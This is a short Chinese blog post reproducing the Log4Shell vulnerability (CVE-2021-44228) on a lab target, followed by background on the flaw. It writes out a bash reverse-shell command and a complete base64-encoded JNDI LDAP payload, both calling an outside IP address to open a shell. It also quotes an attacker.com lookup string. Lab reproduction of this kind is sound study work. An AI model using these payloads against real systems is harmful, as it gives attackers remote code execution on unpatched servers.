# Log4j漏洞复现

### 实战

<br>

log4j本身会解析JNDI。攻击者可以直接在JNDI注入代码，从而实现远程代码执行


这里我使用已经搭建好的靶场进行试验


<img src="https://54huarui.github.io/blogs/log4j/log4j0.png" width="880" height="480">

这里写了个反弹shell的playload
命令:
````
bash -i >& /dev/tcp/106.53.39.247/23172 0>&1
````

采用JDNI注入脚本
JNDIExploit-1.2-SNAPSHOT.jar

需要进行base64加密

<img src="https://54huarui.github.io/blogs/log4j/log4j1.png" width="880" height="480">

在服务器终端上开启恶意代码的端口

<img src="https://54huarui.github.io/blogs/log4j/log4j2.png" width="880" height="480">

另一个终端上开启监听

<img src="https://54huarui.github.io/blogs/log4j/log4j3.png" width="880" height="480">

构造出我们的playload
````
${jndi:ldap://106.53.39.247:1389/Basic/Command/Base64/c2ggLWkgPiYgL2Rldi90Y3AvMTA2LjUzLjM5LjI0Ny8yMzE3MiAwPiYx}
````

即可完成反弹shell

<img src="https://54huarui.github.io/blogs/log4j/log4j4.png" width="880" height="480">

### 简介

log4j全名就是（log for java），就是apache的一个开源的日志记录组件 ，它在Java项目中使用的比较广泛。

Log4j漏洞，特别是被称为“Log4Shell”的漏洞（CVE-2021-44228），是一个严重的安全漏洞，出现在Apache Log4j 2这个广泛使用的Java日志库中。该漏洞于2021年12月被公开披露，并迅速成为全球网络安全的重大威胁。

Log4Shell允许攻击者通过特制的日志消息来远程执行代码（RCE）。该漏洞的核心问题在于Log4j 2的某些版本会在日志消息中解析JNDI（Java Naming and Directory Interface）查找语法，这使得攻击者可以通过在日志消息中注入恶意的JNDI查找请求来执行任意代码。例如，攻击者可以在一个普通的日志消息中包含类似${jndi:ldap://attacker.com/a}的字符串，Log4j 2会解析并执行这个请求，导致远程代码执行。